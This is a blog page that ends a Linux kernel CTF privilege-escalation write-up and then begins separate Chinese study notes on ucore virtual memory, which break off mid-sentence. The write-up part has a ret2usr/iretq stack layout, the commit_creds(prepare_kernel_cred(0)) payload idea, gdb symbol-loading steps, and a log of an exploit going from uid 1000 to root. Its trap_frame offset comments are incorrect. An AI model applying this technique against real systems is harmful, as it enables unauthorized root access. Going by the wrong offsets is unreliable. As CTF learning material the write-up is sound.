<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> {</span></span><br><span class="line">    <span class="keyword">void</span> *rip;       <span class="comment">// instruction pointer +0</span></span><br><span class="line">    <span class="keyword">uint64_t</span> cs;     <span class="comment">// code segment +4</span></span><br><span class="line">    <span class="keyword">uint64_t</span> rflags; <span class="comment">// CPU flags +8</span></span><br><span class="line">    <span class="keyword">void</span> *rsp;       <span class="comment">// stack pointer +12</span></span><br><span class="line">    <span class="keyword">uint64_t</span> ss;     <span class="comment">// stack segment +16</span></span><br><span class="line">} __attribute__((packed));</span><br></pre></td></tr></table></figure>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">|---------|</span><br><span class="line">|iretq;ret| -&gt; the addr of the gadget  High</span><br><span class="line">|---------|</span><br><span class="line">|<span class="built_in"> RIP </span>    | -&gt; instruction address</span><br><span class="line">|---------|</span><br><span class="line">| CS      | -&gt; code segments</span><br><span class="line">|---------|</span><br><span class="line">| EFLAGS  | -&gt; flags <span class="keyword">for</span><span class="built_in"> system </span>status</span><br><span class="line">|---------|</span><br><span class="line">| RSP     | -&gt;<span class="built_in"> user </span>stack pointer</span><br><span class="line">|---------|</span><br><span class="line">| SS      | -&gt;<span class="built_in"> user </span>stack segment			Low</span><br><span class="line">|---------|</span><br></pre></td></tr></table></figure>
<h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>getting privilege escalation via commit_creds(prepare_kernel_cred(0)<br>The above privilege escalation payload allocates a new credential struct (with uid = 0, gid = 0, etc.) and applies it to the <strong>calling process</strong>.</p>
<h2 id="debugging"><a href="#debugging" class="headerlink" title="debugging"></a>debugging</h2><p>target remote:1234&#x901A;&#x8FC7;&#x7AEF;&#x53E3;&#x8C03;&#x8BD5;&#xFF0C;gdb ./vmlinux&#x542F;&#x52A8;&#xFF0C;&#x53EA;&#x52A0;&#x8F7D;&#x4E86; kernel &#x7684;&#x7B26;&#x53F7;&#x8868;&#xFF0C;&#x6A21;&#x5757;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x6838;&#x540E;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x4F5C;&#x4E3A;vmliunx&#x7684;&#x4E00;&#x90E8;&#x5206;&#x4F20;&#x7ED9;gdb&#xFF0C;&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x52A0;&#x8F7D;&#x5185;&#x6838;&#x6A21;&#x5757;&#x7684;&#x7B26;&#x53F7;&#x8868;&#xFF0C;&#x7531;&#x4E8E;&#x6A21;&#x5757;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;ELF&#x6587;&#x4EF6;&#xFF0C;&#x9700;&#x8981;&#x77E5;&#x9053;&#x6A21;&#x5757;&#x7684;.text&#x7684;&#x8282;&#x533A;&#x5730;&#x5740;&#x3002;&#x8FD9;&#x4E2A;&#x4FE1;&#x606F;&#x5206;&#x522B;&#x4FDD;&#x5B58;/sys/module/stack_smashing/sections/.text&#x4E2D;</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux</span><br><span class="line">target remote:1234 </span><br><span class="line">add-symbol-file ./core.ko textaddr</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(chal) gid=1000(chal) groups=1000(chal)</span><br><span class="line">/ $ /tmp/exploit </span><br><span class="line">[*]status has been saved.</span><br><span class="line">vmlinux_base 0xffffffff92800000</span><br><span class="line">vmlinux_base 0xffffffff92800000</span><br><span class="line">[*] <span class="built_in">set</span> off</span><br><span class="line">[*] core_read</span><br><span class="line">[+]canary: 0x808226e1f3461f00</span><br><span class="line">/ $ id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/06/mineucore-虚拟内存管理学习笔记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Po1lux">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/IMG.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Po1lux's Diary">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/06/mineucore-虚拟内存管理学习笔记/" itemprop="url">mineucore-虚拟内存管理学习笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-06T18:51:21+08:00">
                2019-10-06
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/10/06/mineucore-虚拟内存管理学习笔记/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/10/06/mineucore-虚拟内存管理学习笔记/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2019/10/06/mineucore-虚拟内存管理学习笔记/" class="leancloud_visitors" data-flag-title="mineucore-虚拟内存管理学习笔记">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="&#x6982;&#x8FF0;"><a href="#&#x6982;&#x8FF0;" class="headerlink" title="&#x6982;&#x8FF0;"></a>&#x6982;&#x8FF0;</h2><p>&#x865A;&#x62DF;&#x9875;&#x5F0F;&#x5B58;&#x50A8;&#x6280;&#x672F;&#xFF0C;&#x5728;&#x9875;&#x5F0F;&#x5B58;&#x50A8;&#x7BA1;&#x7406;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x589E;&#x52A0;&#x8BF7;&#x6C42;&#x8C03;&#x9875;&#x548C;&#x9875;&#x9762;&#x7F6E;&#x6362;</p>
<p>&#x6709;&#x4E86;&#x9875;&#x5F0F;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x6280;&#x672F;&#xFF0C;CPU&#x4F7F;&#x7528;&#x7684;&#x5730;&#x5740;&#x5DF2;&#x7ECF;&#x4E0D;&#x662F;&#x5B9E;&#x9645;&#x7684;&#x7269;&#x7406;&#x5730;&#x5740;&#x4E86;&#xFF0C;&#x800C;&#x662F;&#x865A;&#x62DF;&#x5730;&#x5740;&#xFF0C;&#x8FDB;&#x800C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x6BB5;&#x754C;&#x9650;&#x6216;&#x9875;&#x8868;&#x9879;&#x6765;&#x8BBE;&#x5B9A;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x65F6;&#x7684;&#x8BBF;&#x95EE;&#x7A7A;&#x95F4;&#xFF0C;&#x786E;&#x4FDD;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x4E0D;&#x8D8A;&#x754C;&#xFF0C;&#x5B8C;&#x6210;&#x5185;&#x5B58;&#x8BBF;&#x95EE;&#x4FDD;&#x62A4;&#x7684;&#x529F;&#x80FD;&#x3002;</p>
<p>&#x4F46;&#x662F;&#x60F3;&#x6700;&#x5927;&#x5316;&#x5229;&#x7528;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF0C;&#x6839;&#x636E;&#x7A0B;&#x5E8F;&#x7684;&#x5C40;&#x90E8;&#x6027;&#x539F;&#x7406;&#xFF0C;&#x5373;&#x7A0B;&#x5E8F;&#x5728;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x8F83;&#x77ED;&#x7684;&#x65F6;&#x671F;&#x5185;&#xFF0C;&#x6240;&#x6267;&#x884C;&#x7684;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x548C;&#x6307;&#x4EE4;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#xFF0C;&#x5206;&#x522B;&#x5C40;&#x9650;&#x4E8E;&#x4E00;&#x5B9A;&#x533A;&#x57DF;&#x3002;&#x53EF;&#x4F7F;&#x7A0B;&#x5E8F;&#x5728;&#x6CA1;&#x6709;&#x8BBF;&#x95EE;&#x67D0;&#x4E2A;&#x865A;&#x62DF;&#x5730;&#x5740;&#x65F6;&#xFF0C;&#x4E0D;&#x5206;&#x914D;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF0C;&#x5F53;&#x7A0B;&#x5E8F;&#x8BBF;&#x95EE;&#x67D0;&#x4E2A;&#x865A;&#x62DF;&#x5730;&#x5740;&#x65F6;&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5728;&#x52A8;&#x6001;&#x7684;&#x5206;&#x914D;&#x5185;&#x5B58;&#xFF0C;&#x5728;&#x9875;&#x8868;&#x4E2D;&#x5EFA;&#x7ACB;&#x865A;&#x62DF;&#x5730;&#x5740;&#x5230;&#x7269;&#x7406;&#x5730;&#x5740;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;<strong>&#x6309;&#x9700;&#x5206;&#x9875;</strong>&#x3002;</p>
<p>&#x4F46;&#x662F;&#x7269;&#x7406;&#x5185;&#x5B58;&#x603B;&#x4F1A;&#x4F7F;&#x7528;&#x6B86;&#x5C3D;&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x53EF;&#x4EE5;&#x5C06;&#x7A0B;&#x5E8F;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x4E2D;&#x4E0D;&#x7ECF;&#x5E38;&#x8BBF;&#x95EE;&#x7684;&#x6570;&#x636E;&#x653E;&#x5165;&#x5916;&#x5B58;&#x4E2D;&#xFF0C;&#x5E76;&#x5728;&#x9875;&#x8868;&#x9879;&#x4E2D;&#x6807;&#x8BB0;&#xFF0C;&#x5F53;&#x53D1;&#x751F;&#x7F3A;&#x9875;&#x5F02;&#x5E38;&#x65F6;&#xFF0C;&#x5C31;&#x628A;&#x5916;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x91CD;&#x65B0;&#x52A0;&#x8F7D;&#x8FDB;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x8FD9;&#x662F;<strong>&#x9875;&#x6362;&#x5165;&#x6362;&#x51FA;&#xFF08;page swap in/out&#xFF09;</strong>&#x6280;&#x672F;&#x3002;&#x5982;&#x4F55;&#x9009;&#x62E9;&#x7269;&#x7406;&#x9875;&#x653E;&#x5165;&#x5916;&#x5B58;&#x4E2D;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;<strong>&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;</strong>&#x7684;&#x5DE5;&#x4F5C;&#x4E86;&#x3002;</p>
<p>&#x5F53;&#x4E24;&#x4E2A;&#x865A;&#x62DF;&#x9875;&#x7684;&#x6570;&#x636E;&#x5185;&#x5BB9;&#x76F8;&#x540C;&#x65F6;&#xFF0C;&#x53EF;&#x53EA;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x7269;&#x7406;&#x9875;&#x6846;&#xFF0C;&#x8FD9;&#x6837;&#x5982;&#x679C;&#x5BF9;&#x4E24;&#x4E2A;&#x865A;&#x62DF;&#x9875;&#x7684;&#x8BBF;&#x95EE;&#x65B9;&#x5F0F;&#x662F;&#x53EA;&#x8BFB;&#x65B9;&#x5F0F;&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x865A;&#x62DF;&#x9875;&#x53EF;&#x5171;&#x4EAB;&#x9875;&#x6846;&#xFF0C;&#x8282;&#x7701;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF1B;&#x5982;&#x679C;CPU&#x5BF9;&#x5176;&#x4E2D;&#x4E4B;&#x4E00;&#x7684;&#x865A;&#x62DF;&#x9875;&#x8FDB;&#x884C;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x5219;&#x8FD9;&#x4E24;&#x4E2A;&#x865A;&#x62DF;&#x9875;&#x7684;&#x6570;&#x636E;&#x5185;&#x5BB9;&#x4F1A;&#x4E0D;&#x540C;&#xFF0C;&#x9700;&#x8981;&#x5206;&#x914D;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x7269;&#x7406;&#x9875;&#x6846;&#xFF0C;&#x5E76;&#x5C06;&#x7269;&#x7406;&#x9875;&#x6846;&#x6807;&#x8BB0;&#x4E3A;&#x53EF;&#x5199;&#xFF0C;&#x8FD9;&#x6837;&#x4E24;&#x4E2A;&#x865A;&#x62DF;&#x9875;&#x9762;&#x5C06;&#x6620;&#x5C04;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x7269;&#x7406;&#x9875;&#x5E27;&#xFF0C;&#x786E;&#x4FDD;&#x6574;&#x4E2A;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x7684;&#x6B63;&#x786E;&#x8BBF;&#x95EE;&#x3002;&#x8FD9;&#x79CD;&#x6280;&#x672F;&#x79F0;&#x4E3A;<strong>&#x5199;&#x65F6;&#x590D;&#x5236;&#xFF08;Copy On Write&#xFF0C;&#x7B80;&#x79F0;COW&#xFF09;</strong>&#x3002;</p>
<p>&#x4E0B;&#x9762;&#x4E3B;&#x8981;&#x5728;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x548C;&#x4E2D;&#x65AD;&#x5F02;&#x5E38;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x5B8C;&#x6210;&#x4E0A;&#x9762;&#x7684;&#x4E09;&#x4E2A;&#x5185;&#x5BB9;&#x3002;</p>
<h2 id="&#x6309;&#x9700;&#x5206;&#x9875;&#x4E0E;FIFO&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;"><a href="#&#x6309;&#x9700;&#x5206;&#x9875;&#x4E0E;FIFO&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;" class="headerlink" title="&#x6309;&#x9700;&#x5206;&#x9875;&#x4E0E;FIFO&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;"></a>&#x6309;&#x9700;&#x5206;&#x9875;&#x4E0E;FIFO&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;</h2><p>&#x5728;&#x7269;&#x7406;&#x5185;&#x5B58;&#x65B9;&#x9762;&#xFF0C;&#x4F7F;&#x7528;Page&#x7ED3;&#x6784;&#x4F53;&#x7BA1;&#x7406;&#x6240;&#x6709;&#x7269;&#x7406;&#x5185;&#x5B58;&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x7269;&#x7406;&#x5E27;&#xFF0C;&#x90FD;&#x5BF9;&#x5E94;&#x4E00;&#x4E2A;Page&#x7ED3;&#x6784;&#x4F53;&#x3002;Page&#x7ED3;&#x6784;&#x4F53;&#x4FDD;&#x5B58;&#x5728;ucore&#x7CFB;&#x7EDF;&#x7684;&#x7269;&#x7406;&#x5185;&#x5B58;&#x4E0A;&#x65B9;&#x3002;&#x4E3A;&#x4E86;&#x5B9E;&#x73B0;&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#xFF0C;&#x5728;Page&#x7ED3;&#x6784;&#x4F53;&#x672B;&#x5C3E;&#xFF0C;&#x6DFB;&#x52A0;&#x4E86;&#x4E24;&#x4E2A;&#x65B0;&#x7684;&#x6210;&#x5458;&#x3002;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> {</span></span><br><span class="line">    <span class="keyword">int</span> ref; <span class="comment">//&#x8BE5;&#x7269;&#x7406;&#x5E27;&#x88AB;&#x7EBF;&#x6027;&#x5730;&#x5740;&#x5F15;&#x7528;&#x7684;&#x6B21;&#x6570;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags; <span class="comment">//&#x63CF;&#x8FF0;&#x9875;&#x9762;&#x5C5E;&#x6027;&#x7684;&#x6807;&#x5FD7;&#x4F4D;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> property; <span class="comment">//&#x63CF;&#x8FF0;&#x8FDE;&#x7EED;&#x7A7A;&#x95F2;&#x5757;&#x7684;&#x6570;&#x91CF;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> page_link; <span class="comment">//&#x7528;&#x4E8E;&#x4E32;&#x8054;&#x7A7A;&#x95F2;&#x5757;&#x53CC;&#x5411;&#x94FE;&#x8868;&#x7684;&#x94FE;&#x63A5;&#x7ED3;&#x6784;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> pra_page_link; <span class="comment">//&#x7528;&#x6765;&#x6784;&#x9020;&#x6309;&#x9875;&#x7684;&#x7B2C;&#x4E00;&#x6B21;&#x8BBF;&#x95EE;&#x65F6;&#x95F4;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x4E2A;&#x94FE;&#x8868;&#xFF0C;&#x8868;&#x5934;&#x65F6;&#x95F4;&#x6700;&#x8FD1;&#xFF0C;&#x8868;&#x5C3E;&#x65F6;&#x95F4;&#x6700;&#x8FDC;</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> pra_vaddr; <span class="comment">//&#x7528;&#x6765;&#x8BB0;&#x5F55;&#x6B64;&#x7269;&#x7406;&#x9875;&#x5BF9;&#x5E94;&#x7684;&#x865A;&#x62DF;&#x9875;&#x8D77;&#x59CB;&#x5730;&#x5740;</span></span><br><span class="line">};</span><br></pre></td></tr></table></figure>
<p>pra_page_link&#x8FD9;&#x4E2A;&#x53CC;&#x5411;&#x94FE;&#x8868;&#x4E5F;&#x662F;&#x6709;&#x5934;&#x7ED3;&#x70B9;&#x7684;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//swap_info.c</span></span><br><span class="line"><span class="keyword">list_entry_t</span> pra_list_head;<span class="comment">//&#x505A;&#x4E3A;&#x5934;&#x7ED3;&#x70B9;&#xFF0C;&#x7528;&#x53CC;&#x5411;&#x94FE;&#x8868;&#x5404;&#x7528;&#x5230;&#x7684;&#x9875;&#x6846;Page&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x6309;&#x7167;&#x65F6;&#x95F4;&#x987A;&#x5E8F;&#xFF0C;&#x4F7F;&#x7528;&#x65F6;&#x5F53;&#x6210;&#x961F;&#x5217;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x4F7F;&#x7528;</span></span><br></pre></td></tr></table></figure>
<p>&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x7528;&#x6237;&#x6001;&#x7684;&#x7A0B;&#x5E8F;&#x6765;&#x8BF4;&#xFF0C;&#x9700;&#x8981;&#x6709;&#x76F8;&#x5173;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x548C;&#x64CD;&#x4F5C;&#x6765;&#x4F53;&#x73B0;&#x4E00;&#x822C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5BF9;&#x865A;&#x62DF;&#x5185;&#x5B58;&#x7684;&#x201C;&#x9700;&#x6C42;&#x201D;&#x3002;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> {</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> mmap_list; <span class="comment">//&#x8FDE;&#x63A5;vma_struct&#x7684;&#x53CC;&#x5411;&#x94FE;&#x8868;&#x7684;&#x5934;&#x7ED3;&#x70B9;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">mmap_cache</span>;</span> <span class="comment">//&#x6307;&#x5411;&#x5F53;&#x524D;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x7684;vma&#x7ED3;&#x6784;&#xFF0C;&#x7528;&#x4E8E;&#x63D0;&#x901F;</span></span><br><span class="line">    <span class="keyword">pde_t</span> *pgdir; <span class="comment">//&#x6307;&#x5411;&#x5F53;&#x524D;mm&#x6570;&#x636E;&#x7ED3;&#x6784;&#x6240;&#x7EF4;&#x62A4;&#x7684;&#x9875;&#x76EE;&#x5F55;&#x8868;</span></span><br><span class="line">    <span class="keyword">int</span> map_count; <span class="comment">//&#x5176;&#x94FE;&#x63A5;&#x7684;vma_struct&#x7684;&#x6570;&#x91CF;</span></span><br><span class="line">    <span class="keyword">void</span> *sm_priv; <span class="comment">//&#x6307;&#x5411;&#x7528;&#x6765;&#x94FE;&#x63A5;&#x8BB0;&#x5F55;&#x9875;&#x8BBF;&#x95EE;&#x60C5;&#x51B5;&#x7684;&#x94FE;&#x8868;&#x5934;</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> {</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span> <span class="comment">//&#x6307;&#x5411;&#x5934;mm&#x7ED3;&#x6784;</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_start; <span class="comment">//&#x865A;&#x62DF;&#x5730;&#x5740;&#x7684;&#x8D77;&#x59CB;&#x5730;&#x5740;</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_end; <span class="comment">//&#x865A;&#x62DF;&#x5730;&#x5740;&#x7684;&#x7ED3;&#x675F;&#x5730;&#x5740;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> vm_flags; <span class="comment">//&#x865A;&#x62DF;&#x7A7A;&#x95F4;&#x7684;&#x6807;&#x5FD7;&#x4F4D;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> list_link; <span class="comment">//&#x53CC;&#x5411;&#x94FE;&#x8868;&#x7684;&#x8FDE;&#x63A5;&#x7ED3;&#x6784;&#xFF08;&#x6309;&#x7167;&#x5730;&#x5740;&#x6392;&#x5E8F;&#xFF09;</span></span><br><span class="line">};</span><br></pre></td></tr></table></figure>
<p>mm_struct&#x7EF4;&#x62A4;&#x4E00;&#x4E2A;&#x9875;&#x8868;&#x7684;&#x53EF;&#x7528;&#x7A7A;&#x95F2;&#x7A7A;&#x95F4;&#xFF0C;&#x5177;&#x4F53;&#x6765;&#x8BF4;&#x662F;&#x4E00;&#x4E2A;mm_struct&#x4E0B;&#x94FE;&#x63A5;&#x591A;&#x4E2A;vma_struct&#xFF0C;vma_struct&#x6807;&#x8BB0;&#x4E86;&#x8FD9;&#x4E2A;4M&#x7A7A;&#x95F4;&#x4E2D;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7684;&#x865A;&#x62DF;&#x7A7A;&#x95F4;&#xFF0C;&#x5404;&#x4E2A;vma_struct&#x95F4;&#x901A;&#x8FC7;list_link&#x53CC;&#x5411;&#x94FE;&#x8868;&#x94FE;&#x63A5;&#xFF0C;&#x800C;mm_struct&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x53CC;&#x5411;&#x94FE;&#x8868;&#x7684;&#x8868;&#x5934;&#x3002;</p>
<p>&#x5F53;&#x9875;&#x8868;&#x6620;&#x5C04;&#x5230;&#x7269;&#x7406;&#x5185;&#x5B58;&#x65F6;&#xFF0C;&#x9875;&#x8868;&#x5185;&#x5BB9;&#x4E3A;&#x9875;&#x5E27;&#x7684;&#x5730;&#x5740;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x6807;&#x5FD7;&#x4F4D;&#xFF0C;&#x4F46;&#x662F;&#x5F53;&#x865A;&#x62DF;&#x5185;&#x5B58;&#x6620;&#x5C04;&#x5230;&#x5916;&#x5B58;&#x65F6;&#xFF0C;&#x5176;&#x9875;&#x8868;&#x5185;&#x5BB9;&#x5982;&#x4F55;&#x8BBE;&#x8BA1;&#xFF1F;&#x5373;&#x5982;&#x4F55;&#x533A;&#x5206;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7684;&#x6620;&#x5C04;&#x548C;swap&#x533A;&#x7684;&#x6620;&#x5C04;&#x3002;</p>
<p>&#x4E00;&#x4E2A;&#x9875;&#x5927;&#x5C0F;&#x4E3A;4kb&#xFF0C;&#x5F53;&#x6620;&#x5C04;&#x5230;&#x786C;&#x76D8;&#x4E2D;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x5360;&#x7528;8&#x4E2A;&#x6247;&#x533A;&#xFF08;0.5kb/&#x6247;&#x533A;&#xFF09;&#x3002;&#x53EF;&#x5C06;PTE&#xFF08;&#x9875;&#x8868;&#x9879;&#xFF09;&#x7684;&#x9AD8;24&#x4F4D;&#x8868;&#x793A;&#x5BF9;&#x6362;&#x5230;&#x786C;&#x76D8;&#x4E0A;&#x7684;&#x9875;&#x7684;&#x8D77;&#x59CB;&#x6247;&#x533A;&#x53F7;&#xFF0C;&#x5E76;&#x5C06;bit 0&#x7F6E;&#x4E3A;0&#xFF0C;&#x5373;&#x5F53;PTE&#x9AD8;24&#x4F4D;&#x4E0D;&#x4E3A;0&#xFF0C;&#x4E14;bit 0&#x4E3A;0&#xFF0C;&#x5219;&#x8BF4;&#x660E;&#x8BE5;&#x7269;&#x7406;&#x9875;&#x88AB;&#x6620;&#x5C04;&#x5230;&#x4E86;swap&#x533A;&#x3002;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">swap_entry_t</span></span><br><span class="line">* --------------------------------------------</span><br><span class="line">* |         offset        |   reserved   | <span class="number">0</span> |</span><br><span class="line">* --------------------------------------------</span><br><span class="line">*           <span class="number">24</span> bits            <span class="number">7</span> bits    <span class="number">1</span> bit</span><br></pre></td></tr></table></figure>
<p>&#x7F3A;&#x9875;&#x4E2D;&#x65AD;&#x7684;&#x5904;&#x7406;&#x51FD;&#x6570;&#x4E3B;&#x8981;&#x662F;do_pgfault&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x4E24;&#x4E2A;&#x5206;&#x652F;&#xFF1A;1&#xFF09;&#x5F53;&#x53D1;&#x751F;&#x7F3A;&#x9875;&#x4E2D;&#x65AD;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x9875;&#x8868;&#x9879;&#x7684;&#x5185;&#x5BB9;&#x4E3A;0&#xFF0C;&#x5219;&#x8868;&#x793A;&#x53D1;&#x751F;&#x7F3A;&#x9875;&#x5F02;&#x5E38;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x4F1A;&#x8BF7;&#x6C42;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x7269;&#x7406;&#x9875;&#xFF0C;&#x7136;&#x540E;&#x66F4;&#x65B0;&#x9875;&#x8868;&#x5185;&#x5BB9;&#xFF0C;&#x5B8C;&#x6210;&#x6620;&#x5C04;&#x8FC7;&#x7A0B;&#x3002;2&#xFF09;&#x5982;&#x679C;&#x4E0D;&#x4E3A;0&#xFF0C;&#x5219;&#x4E3A;&#x662F;&#x4E00;&#x4E2A;&#x6620;&#x5C04;&#x5230;swap&#x533A;&#x7684;&#x7F3A;&#x9875;&#x5F02;&#x5E38;&#x3002;&#x5F53;&#x7136;&#x4E0D;&#x4F1A;&#x76F4;&#x63A5;&#x5230;&#x8FD9;&#x4E24;&#x4E2A;&#x5206;&#x652F;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x6839;&#x636E;&#x9519;&#x8BEF;&#x53F7